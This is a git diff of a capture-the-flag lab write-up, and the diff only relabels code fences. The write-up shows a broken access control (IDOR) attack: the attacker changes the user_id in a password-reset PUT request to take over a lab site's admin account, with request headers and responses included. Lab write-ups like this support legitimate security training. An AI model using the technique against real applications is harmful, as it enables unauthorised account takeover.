@@ -6,7 +6,7 @@ author: Shawn Szczepkowski
 Todays lab is the CopyPasta Broken Access Control Password Reset lab from [bugforge.io](https://bugforge.io). This is an easy rated lab.
 
 Exploring the functionality of todays lab we notice interestingly that when we reset our password, the PUT request to `/api/profile/password` includes the `user_id` in the body of the request.
-```http
+```sh
 PUT /api/profile/password HTTP/2
 Host: fdc61a245153.labs.bugforge.io
 Content-Length: 35
@@ -35,7 +35,7 @@ Priority: u=1, i
 We also noticed earlier while exploring that we are able to make a request to each users profile like `GET /api/profile/admin` which returns their `user_id` in the response.
 
 Let's see if we are able to reset the `admin` users password by passing the `user_id` of `1` in our request.
-```http
+```sh
 PUT /api/profile/password HTTP/2
 Host: fdc61a245153.labs.bugforge.io
 Content-Length: 35
@@ -62,7 +62,7 @@ Priority: u=1, i
 ```
 
 Looks like we are successful.
-```http
+```sh
 HTTP/2 200 OK
 Access-Control-Allow-Origin: *
 Content-Type: application/json; charset=utf-8
@@ -77,7 +77,7 @@ Content-Length: 43
 ```
 
 When we return to the application and login as the admin user, we will notice that the users first code snippet has been changed granting us our flag and a success message.
-```http
+```sh
 HTTP/2 200 OK
 Access-Control-Allow-Origin: *
 Content-Type: application/json; charset=utf-8
